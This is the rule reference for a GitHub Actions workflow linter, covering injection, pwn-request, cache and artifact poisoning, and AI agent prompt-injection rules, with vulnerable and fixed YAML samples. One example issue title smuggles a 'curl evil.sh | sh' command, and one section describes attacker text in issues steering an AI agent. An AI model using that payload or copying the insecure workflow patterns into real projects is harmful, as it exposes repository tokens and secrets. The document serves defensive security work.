# Injection and untrusted input

These rules follow data an outsider controls — event payload fields, agent prompts, artifacts, caches — to the place
where it acts: a shell command, a JavaScript script, an environment file, or a job that runs with the base
repository's privileges. They also flag the triggers and paths that make that reach easier.

The output below shows only the findings of the rule being explained. The command ran with `--persona auditor`, so
the same run also reports naming, runtime-monitoring, trigger, and permission findings, which the summary line counts.

## `script-injection`

Untrusted event data and composite action inputs must not be expanded into scripts with `${{ }}`.

| Severity | Persona | Scope | Fix | Equivalent in |
|---|---|---|---|---|
| error | regular | workflow | none | zizmor: `template-injection`; actionlint: `expression`; ghlint: `ShellScriptInjection`, `JSScriptInjection` |

**What it reports.** A step's `run` script, or the `script` input of `actions/github-script`, that expands an
untrusted context with `${{ }}`. Untrusted contexts are `github.event` paths ending in `body`, `default_branch`,
`email`, `head_ref`, `label`, `message`, `name`, `page_name`, `ref`, `title`, `head_branch`, or `display_title`;
`github.head_ref`; the `changes.<field>.from` value an `edited` event carries for one of those fields; and
`toJSON()` of `github`, `github.event`, or an object that holds free text such as `issue`, `pull_request`,
`comment`, `review`, or `workflow_run`, except when the value ends in a field that holds a number, flag, hash, enum,
timestamp, or URL. In
an action file, `inputs.*` reads count as untrusted too, since the caller chooses them. Index syntax, upper case,
and spaces inside the brackets name the same path. Comparisons, `!`, and the boolean functions `contains`,
`startsWith`, and `endsWith` return only true or false, so they are not reported; `&&` and `||` return an operand,
so they are. A value passed through `env` is not reported, because the script reads it as data.

**Why it matters.** GitHub
[documents](https://docs.github.com/en/actions/concepts/security/script-injections) that a context expanded into a
script is script injection: an issue title such as `"; curl evil.sh | sh; echo "` runs as shell code with the job's
token and secrets.

**Example.**

```yaml
name: Triage
on: [issues]
permissions: {}
jobs:
  triage:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - run: echo "${{ github.event.issue.title }}"
```

```text
error[script-injection]: untrusted `github.event.issue.title` expands into a script
 --> .github/workflows/example.yml:9:9
  |
9 |       - run: echo "${{ github.event.issue.title }}"
  |         ^^^ job `triage`, step 1
  |
  = help: Untrusted event data and composite action inputs must not be expanded into scripts with `${{ }}`.
  = note: same as zizmor: template-injection; actionlint: expression; ghlint: ShellScriptInjection, JSScriptInjection

Checked 1 workflow file: 5 findings (1 error, 4 notes).
```

Compliant:

```yaml
name: Triage
on: [issues]
permissions: {}
jobs:
  triage:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - env:
          TITLE: ${{ github.event.issue.title }}
        run: echo "$TITLE"
```

**How to fix.** Put the expression in the step's `env` and read the variable in the script: `$TITLE` in a shell
step, `process.env.TITLE` in a `github-script` step. The value then reaches the script as data, and the shell or
JavaScript handles it. Validate it where the script uses it as an argument or a path. `--fix` does not rewrite it,
because the step needs a new `env` entry and a new way to read the value. To accept one finding, see
[ignoring findings](../configuration.md#ignoring-findings).

All fixtures for this rule: [examples](../rule-examples.md#script-injection).

## `github-env-injection`

GITHUB_ENV and GITHUB_PATH must not be written from untrusted data or in privileged runs.

| Severity | Persona | Scope | Fix | Equivalent in |
|---|---|---|---|---|
| error | regular | workflow | none | zizmor: `github-env` |

**What it reports.** A `run` script that writes `GITHUB_ENV` or `GITHUB_PATH` in either of two situations: the
workflow runs on `pull_request_target` or `workflow_run`, where any write reaches later steps of a privileged job;
or the written text expands an untrusted context, or reads an environment variable whose value comes from one, with
the step `env` overriding the job's and the job's overriding the workflow's. A write is a `>`, `>|`, or `>>`
redirect into the file, `tee`, PowerShell's `Out-File`, `Add-Content`, or `Set-Content` naming it, or Python opening
`os.environ["GITHUB_ENV"]` to append or write; the heredoc, `{ }`, `( )`, loop body, or Python block the write reads
counts as part of it. Names compare in lower case, and `${{ github.env }}` and `${{ github.path }}` are read as the
same files. Reading the path writes nothing, and `GITHUB_OUTPUT` is not covered.

**Why it matters.** An environment file write sets a variable or a `PATH` entry for every later step, so a
pull request title that reaches it changes what the privileged job runs. GitHub describes the write in its
[workflow commands reference](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands#setting-an-environment-variable).

**Example.**

```yaml
name: Environment file
on: pull_request_target
permissions: {}
jobs:
  build:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - run: echo "NAME=value" >> "${GITHUB_ENV}"
```

```text
error[github-env-injection]: writes GITHUB_ENV or GITHUB_PATH from an untrusted context
 --> .github/workflows/example.yml:9:9
  |
9 |       - run: echo "NAME=value" >> "${GITHUB_ENV}"
  |         ^^^ job `build`, step 1
  |
  = help: GITHUB_ENV and GITHUB_PATH must not be written from untrusted data or in privileged runs.
  = note: same as zizmor: github-env

Checked 1 workflow file: 6 findings (1 error, 1 warning, 4 notes).
```

Compliant:

```yaml
name: Environment file
on: pull_request_target
permissions: {}
jobs:
  build:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    env:
      NAME: value
    steps:
      - run: echo "$NAME" > log.txt
```

**How to fix.** Set the value in `env` at the narrowest scope that works, with a literal or a value the job has
checked, and keep environment file writes out of `pull_request_target` and `workflow_run` workflows. `--fix` leaves
it alone: moving a value to `env` changes where the script reads it. To accept one finding, see
[ignoring findings](../configuration.md#ignoring-findings).

All fixtures for this rule: [examples](../rule-examples.md#github-env-injection).

## `llm-prompt-injection`

AI agent actions must not receive untrusted event data or run on events outsiders trigger.

| Severity | Persona | Scope | Fix | Equivalent in |
|---|---|---|---|---|
| error | regular | workflow | none | none |

**What it reports.** A step whose action is `anthropics/claude-code-action`, `anthropics/claude-code-base-action`,
`openai/codex-action`, `google-github-actions/run-gemini-cli`, or `actions/ai-inference`, when the workflow runs on an
event an outsider can start (`fork`, `watch`, `issues`, `issue_comment`, `discussion`, `discussion_comment`,
`pull_request_target`, `pull_request_review`, `pull_request_review_comment`, `workflow_run`), or when any `with`
value expands an untrusted context. One finding per step, and the message says which of the two conditions held. The
list of agent actions is fixed, so an agent action outside it is not checked.

**Why it matters.** An agent reads its prompt as instructions, so a pull request body, issue title, or commit
message that reaches it can make the agent act on the attacker's instructions. TaintAWI
([arXiv 2605.07135](https://arxiv.org/abs/2605.07135)) traces this prompt-to-agent path in GitHub Actions workflows.

**Example.**

```yaml
name: Agent on comments
on:
  issue_comment:
    types: [created]
permissions: {}
jobs:
  agent:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: anthropics/claude-code-action@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          prompt: Review this issue
```

```text
error[llm-prompt-injection]: agent runs on an event that outsiders can trigger
  --> .github/workflows/example.yml:11:9
   |
11 |       - uses: anthropics/claude-code-action@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
   |         ^^^^ job `agent`, step 1
   |
   = help: AI agent actions must not receive untrusted event data or run on events outsiders trigger.

Checked 1 workflow file: 3 findings (1 error, 2 notes).
```

Compliant:

```yaml
name: Agent on comments
on: [pull_request]
permissions: {}
jobs:
  agent:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: anthropics/claude-code-action@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          prompt: Review this pull request
```

**How to fix.** Move the agent to `workflow_dispatch` or `schedule` when it should run only under maintainer control,
and keep event payload out of the prompt. The rule does not report `pull_request`, but an outside contributor can
start that event too. Where the agent must read a comment or an issue, gate the step on a maintainer
or a label, and state in the prompt that the quoted text is data, never instructions. `--fix` does not rewrite it:
only the author knows which gate the agent may run behind. To accept one finding, see
[ignoring findings](../configuration.md#ignoring-findings).

All fixtures for this rule: [examples](../rule-examples.md#llm-prompt-injection).

## `pwn-request`

Privileged triggers must not check out or run pull request code.

| Severity | Persona | Scope | Fix | Equivalent in |
|---|---|---|---|---|
| error | regular | workflow | none | none |

**What it reports.** A step that checks out or fetches the pull request's code in a workflow triggered by
`pull_request_target` or `workflow_run`. The checkout form is `actions/checkout` with `ref` or `repository` naming
the fork's head: `github.event.pull_request.head.*`, `merge_commit_sha`, `github.head_ref`, `refs/pull/`, or
`github.event.workflow_run.head_*`. The fetch form is `gh pr checkout`, or `git fetch`, `pull`, `clone`, `checkout`,
or `switch` whose arguments hold `pull/` or one of those refs; options before the subcommand and a `sudo` wrapper
are read through. Comparisons ignore case and bracket style. Fetching the base branch, and a pull request number
used only in a message or an API URL, are not reported.

**Why it matters.** GitHub Security Lab's
["preventing pwn requests"](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
describes the attack: the privileged run executes code the pull request's author wrote, with the base repository's
token and secrets available to it.

**Example.**

```yaml
name: Privileged PR build
on:
  pull_request_target:
    types: [opened]
permissions: {}
jobs:
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          persist-credentials: false
```

```text
error[pwn-request]: privileged trigger checks out untrusted pull request code
  --> .github/workflows/example.yml:11:9
   |
11 |       - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
   |         ^^^^ job `test`, step 1
   |
   = help: Privileged triggers must not check out or run pull request code.

Checked 1 workflow file: 4 findings (1 error, 1 warning, 2 notes).
```

Compliant:

```yaml
name: Privileged PR build
on:
  pull_request_target:
    types: [opened]
permissions: {}
jobs:
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          ref: ${{ github.event.pull_request.base.sha }}
          persist-credentials: false
```

**How to fix.** Drop the `ref` and `repository` inputs that name the fork's head, so the checkout stays on the base
commit. When the privileged job needs the pull request's content, read it through the API, or split the work: an
unprivileged `pull_request` workflow builds and uploads an artifact, and a privileged `workflow_run` job downloads it
into `${{ runner.temp }}` after review. `--fix` does not rewrite it. To accept one finding, see
[ignoring findings](../configuration.md#ignoring-findings).

All fixtures for this rule: [examples](../rule-examples.md#pwn-request).

## `dangerous-trigger`

pull_request_target and workflow_run run with base repository privileges.

| Severity | Persona | Scope | Fix | Equivalent in |
|---|---|---|---|---|
| warning | pedantic | workflow | none | zizmor: `dangerous-triggers` |

**What it reports.** Each trigger of the workflow whose event is `pull_request_target` or `workflow_run`, one finding
per trigger, whether the workflow writes `on` as a mapping or as a list. It reports the trigger itself, not what the
job does with it, so a workflow whose jobs stay on the base commit is still reported.

**Why it matters.** Both events run in the context of the base repository, with its token, secrets, and cache scope,
while the event describes code and text the pull request's author controls. zizmor names this audit
`dangerous-triggers`, and the [pwn request](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
write-up shows what a privileged run does with that input.

**Example.**

```yaml
name: Triggers
on:
  pull_request_target:
  workflow_run:
    workflows: [CI]
permissions: {}
jobs:
  noop:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - run: echo ok
```

```text
warning[dangerous-trigger]: `pull_request_target` runs with base repository privileges
 --> .github/workflows/example.yml:3:3
  |
3 |   pull_request_target:
  |   ^^^^^^^^^^^^^^^^^^^ workflow
  |
  = help: pull_request_target and workflow_run run with base repository privileges.
  = note: same as zizmor: dangerous-triggers

warning[dangerous-trigger]: `workflow_run` runs with base repository privileges
 --> .github/workflows/example.yml:4:3
  |
4 |   workflow_run:
  |   ^^^^^^^^^^^^ workflow
  |
  = help: pull_request_target and workflow_run run with base repository privileges.
  = note: same as zizmor: dangerous-triggers

Checked 1 workflow file: 6 findings (2 warnings, 4 notes).
```

Compliant:

```yaml
name: Triggers
on:
  pull_request:
  workflow_dispatch:
permissions: {}
jobs:
  noop:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - run: echo ok
```

**How to fix.** Use `pull_request` when the job does not need the base repository's privileges. When a privileged step is unavoidable, keep it to metadata the API returns
and do the build in a `pull_request` workflow, as [`pwn-request`](#pwn-request) describes. `--fix` does not rewrite
the trigger, because changing it changes what the workflow may do. To accept one finding, see
[ignoring findings](../configuration.md#ignoring-findings).

All fixtures for this rule: [examples](../rule-examples.md#dangerous-trigger).

## `unsafe-if-condition`

Conditions must not be constant, always true, or based on spoofable bot names.

| Severity | Persona | Scope | Fix | Equivalent in |
|---|---|---|---|---|
| warning | regular | workflow | [`--fix`](../fixes.md) | zizmor: `bot-conditions`, `unsound-condition`; actionlint: `if-cond`; ghlint: `DoubleCurlyIf` |

**What it reports.** A job or step `if` in one of three shapes: a boolean scalar, such as `if: true`, which is
constant; a string that holds `${{ }}` next to other text, which GitHub substitutes into one non-empty string and so
reads as true; or a condition that trusts a bot name, meaning `github.actor` or `github.triggering_actor` compared
with `==`, or passed to `contains`, `startsWith`, or `endsWith`, against a value holding `[bot]`. A negated check or
`!=` is not reported, because a spoofed actor only makes it skip the step.

**Why it matters.** GitHub evaluates `if` as an expression with or without `${{ }}`, but when the delimiters wrap only
part of the value, the text around them turns the whole value into a non-empty string
([expressions](https://docs.github.com/en/actions/reference/workflows-and-actions/expressions)), so a condition that
mixes both forms always runs the job or step, including on the events it meant to exclude. An actor name is set by
whoever pushed the commit or opened the pull request, so a bot check does not prove the event came from that bot.

**Example.**

```yaml
name: Deploy
on: [push]
permissions: {}
jobs:
  deploy:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - if: ${{ github.event_name }} == 'push'
        run: echo deploy
```

```text
warning[unsafe-if-condition]: text around `${{ }}` makes the condition always true
 --> .github/workflows/example.yml:9:9
  |
9 |       - if: ${{ github.event_name }} == 'push'
  |         ^^ job `deploy`, step 1
  |
  = help: Conditions must not be constant, always true, or based on spoofable bot names.
  = note: same as zizmor: bot-conditions, unsound-condition; actionlint: if-cond; ghlint: DoubleCurlyIf

Checked 1 workflow file: 7 findings (1 warning, 6 notes).
1 finding has a fix: rerun with --fix.
```

Compliant:

```yaml
name: Deploy
on: [push]
permissions: {}
jobs:
  deploy:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - if: ${{ github.event_name == 'push' }}
        run: echo deploy
```

**How to fix.** `--fix` rewrites a condition that mixes `${{ }}` with text into one expression in a single
`${{ }}`, grouping each segment where the operator beside it binds tighter. It leaves constant conditions, bot
checks, and conditions it cannot join into one expression, such as a context outside `${{ }}` or a YAML style it
cannot rewrite without changing the file's meaning; the reasons are in [Fixes](../fixes.md). Replace a constant
condition with the check the job needs, and a bot check with a test of the pull request author or of the event's
own fields. To accept one finding, see [ignoring findings](../configuration.md#ignoring-findings).

All fixtures for this rule: [examples](../rule-examples.md#unsafe-if-condition).

## `artifact-poisoning`

Artifacts from other runs must not be extracted into the workspace.

| Severity | Persona | Scope | Fix | Equivalent in |
|---|---|---|---|---|
| warning | regular | workflow | none | none |

**What it reports.** In a workflow triggered by `workflow_run`, a step that downloads an artifact of another run —
`actions/download-artifact` with a `run-id` input, or `dawidd6/action-download-artifact` — and whose `path`,
with spaces removed, does not start with `${{runner.temp}}` or `/tmp`. The comparison is on the text, so
`${{ runner.temp }}/x` counts, and a step without `path` extracts into the workspace. Downloads of the current run's
artifacts are not reported.

**Why it matters.** CodeQL's `actions/artifact-poisoning` query names the attack: the artifact carries files the pull
request's workflow chose, and extracting it into the workspace lets them overwrite what the privileged job is about
to run or read.

**Example.**

```yaml
name: Report
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
permissions: {}
jobs:
  report:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/download-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ github.token }}
```

```text
warning[artifact-poisoning]: artifact from another run is extracted into the workspace
  --> .github/workflows/example.yml:12:9
   |
12 |       - uses: actions/download-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
   |         ^^^^ job `report`, step 1
   |
   = help: Artifacts from other runs must not be extracted into the workspace.

Checked 1 workflow file: 4 findings (2 warnings, 2 notes).
```

Compliant:

```yaml
name: Report
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
permissions: {}
jobs:
  report:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/download-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ github.token }}
          path: ${{ runner.temp }}/artifacts
```

**How to fix.** Extract into `${{ runner.temp }}` and read only the files the job expects, by name. Never add the
directory to `PATH`, source a script from it, or run anything it holds before checking it. `--fix` does not rewrite
the step, because the new path depends on what the job reads. To accept one finding, see
[ignoring findings](../configuration.md#ignoring-findings).

All fixtures for this rule: [examples](../rule-examples.md#artifact-poisoning).

## `cache-poisoning`

Caches must not be writable from low-trust triggers or restored into release builds.

| Severity | Persona | Scope | Fix | Equivalent in |
|---|---|---|---|---|
| warning | regular | workflow | none | zizmor: `cache-poisoning` |

**What it reports.** Four situations. On a trigger outside the trusted set (`push`, `workflow_dispatch`,
`repository_dispatch`, `delete`, `registry_package`, `page_build`, `schedule`, `pull_request`, `workflow_call`), a
`cache-mode: write` or `write-only` on the workflow or on a job. When an outsider can start the run, a job that calls
a reusable workflow without `cache-mode` while the workflow sets none, because the called workflow may ask for
writes. On
`pull_request_target` or `workflow_run`, a cache saved after the step that checked out the pull request's head: the
save lands in the base branch's cache scope, and the setup actions save in a post step at the end of the job, with
`setup-node` from v5 caching by default unless `package-manager-cache: false` is set. In a release build — the
`release` trigger, or `push` with `tags` — any step that uses a cache at all. `actions/cache/save` counts only when
it runs after the checkout, and `actions/cache/restore` never saves.

**Why it matters.** A cache the attacker's run writes is restored by later trusted runs, so build output, dependency
archives, or `PATH` entries come from code the attacker chose. GitHub documents the
[untrusted-trigger cache restriction](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching#bypassing-the-default-untrusted-trigger-cache-restriction)
that `cache-mode: write` reopens.

**Example.**

```yaml
name: Release
on:
  push:
    tags: ['v*']
permissions: {}
jobs:
  release:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/cache@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          path: ~/.cargo
          key: cargo
```

```text
warning[cache-poisoning]: release build restores a cache that other runs can write
  --> .github/workflows/example.yml:11:9
   |
11 |       - uses: actions/cache@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
   |         ^^^^ job `release`, step 1
   |
   = help: Caches must not be writable from low-trust triggers or restored into release builds.
   = note: same as zizmor: cache-poisoning

Checked 1 workflow file: 4 findings (1 warning, 3 notes).
```

Compliant:

```yaml
name: Release
on:
  push:
    tags: ['v*']
permissions: {}
jobs:
  release:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - run: cargo build --release
```

**How to fix.** Keep caches out of release builds, or build the release in a job that restores nothing and verify the
artifacts another way. On a low-trust trigger, set `cache-mode: read` on the workflow, or `none` where nothing should
be restored, and never save a cache after running pull request code. `--fix` does not rewrite it. To accept one
finding, see [ignoring findings](../configuration.md#ignoring-findings).

All fixtures for this rule: [examples](../rule-examples.md#cache-poisoning).

## `obfuscation`

`uses` paths and expressions must not hide what they reference.

| Severity | Persona | Scope | Fix | Equivalent in |
|---|---|---|---|---|
| warning | pedantic | workflow | none | zizmor: `obfuscation` |

**What it reports.** Two shapes. A `uses` path whose part before `@` holds `//`, a `.` or `..` segment, or a
trailing `/`, as in `actions//checkout` or `github/codeql-action/./init`; local actions (`./`, `$/`) and container
images (`docker://`) are exempt. An expression that is only a string literal, as in `${{ 'hello' }}`, or that contains
`github[` index syntax, as in `${{ github['event'] }}`, with one finding per YAML value. The first covers a job's `uses`
and every step's `uses`; the second covers any string in the file.

**Why it matters.** zizmor's `obfuscation` audit records what these forms have in common: the path or the expression
does not say plainly what it references, so a reader, a reviewer, and a policy that matches `uses` by name see the
written form rather than the referent.

**Example.**

```yaml
name: Obfuscation
on: [push]
permissions: {}
jobs:
  build:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions//checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      - run: echo ${{ 'hello' }}
```

```text
warning[obfuscation]: `uses` path contains redundant segments
 --> .github/workflows/example.yml:9:9
  |
9 |       - uses: actions//checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
  |         ^^^^ job `build`, step 1
  |
  = help: `uses` paths and expressions must not hide what they reference.
  = note: same as zizmor: obfuscation

warning[obfuscation]: expression hides a literal or a context path
  --> .github/workflows/example.yml:10:9
   |
10 |       - run: echo ${{ 'hello' }}
   |         ^^^ workflow
   |
   = help: `uses` paths and expressions must not hide what they reference.
   = note: same as zizmor: obfuscation

Checked 1 workflow file: 8 findings (2 warnings, 6 notes).
```

Compliant:

```yaml
name: Obfuscation
on: [push]
permissions: {}
jobs:
  build:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      - run: echo hello
```

**How to fix.** Write the action path in its canonical form, with one `/` between segments and no `.` or `..`, and
write a context path in dotted form (`github.event.issue.title`). Replace a string literal in an expression with the
text it stands for. `--fix` does not rewrite either form. To accept one finding, see
[ignoring findings](../configuration.md#ignoring-findings).

All fixtures for this rule: [examples](../rule-examples.md#obfuscation).
